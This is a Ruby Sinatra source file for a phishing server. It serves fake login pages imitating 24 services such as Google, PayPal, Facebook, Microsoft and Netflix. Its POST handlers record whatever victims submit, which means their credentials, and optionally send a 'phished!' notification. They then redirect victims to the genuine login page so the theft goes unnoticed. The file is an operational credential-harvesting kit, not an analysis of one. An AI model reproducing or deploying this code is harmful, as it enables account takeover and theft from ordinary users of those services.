#!/usr/bin/ruby
require 'sinatra'
require 'mail'
require 'dotenv/load'
require_relative 'notifications'
require_relative 'store.rb'

class Public < Sinatra::Base
  SMS = false
  site = ENV['SITE']
  phishing_pages = [
    'adobe',
    'amazon',
    'dropbox',
    'ebay',
    'facebook',
    'fbmobile',
    'github',
    'google',
    'instagram',
    'linkedin',
    'messenger',
    'microsoft',
    'modal',
    'netflix',
    'paypal',
    'plugin-update',
    'snapchat',
    'spotify',
    'starbucks',
    'steam',
    'twitch',
    'twitter',
    'wordpress',
    'yahoo'
  ]
  #phishing_pages = ['youtube']
  redir = {
    adobe: 'https://accounts.adobe.com/',
    amazon: 'https://www.amazon.com/ap/signin',
    dropbox: 'https://www.dropbox.com/en_GB/login',
    ebay: 'https://www.ebay.com/signin/',
    facebook: 'https://www.facebook.com/login/',
    fbmobile: 'https://www.facebook.com/login/',
    github: 'https://github.com/',
    google: 'https://myaccount.google.com/',
    instagram: 'https://www.instagram.com',
    linkedin: 'https://www.linkedin.com/uas/login?_l=en',
    messenger: 'https://www.messenger.com/login/',
    microsoft: 'https://account.microsoft.com/account',
    modal: 'https://www.google.com',
    netflix: 'https://www.netflix.com/Login',
    paypal: 'https://www.paypal.com/signin',
    snapchat: 'https://accounts.snapchat.com/accounts/login',
    spotify: 'https://spotify.me',
    starbucks: 'https://www.starbucks.com/',
    steam: 'https://store.steampowered.com/login',
    twitch: 'https://www.twitch.tv/login',
    twitter: 'https://twitter.com/',
    wordpress: 'https://wordpress.com/log-in',
    yahoo: 'https://login.yahoo.com/'
  }

  def initialize
    super
    @notifications = Notifications.new
  end

  # 404
  not_found do
    File.read(File.join('public', 'index.html'))
  end

  # Index
  # get '/' do
  #   File.read(File.join('public', 'index.html'))
  #   redirect "/#{ENV['SITE']}" #unless ENV['site'].empty?
  # end

  #
  # Phishing pages
  #

  get '/' do
    File.read(File.join('public', "pages/#{ site }/index.html"))
  end

  post '/' do
    wirte_file(site, params)
    @notifications.mail("#{ site } phished!", msg) if SMS
    redirect redir[site.to_sym]
  end
  
  phishing_pages.each do |path|
    get '/' + path do
      File.read(File.join('public', "pages/#{ path }/index.html"))
    end

    post '/' + path do
      wirte_file(path, params)
      @notifications.mail("#{ path } phished!", msg) if SMS
      redirect redir[path.to_sym]
    end
  end
end
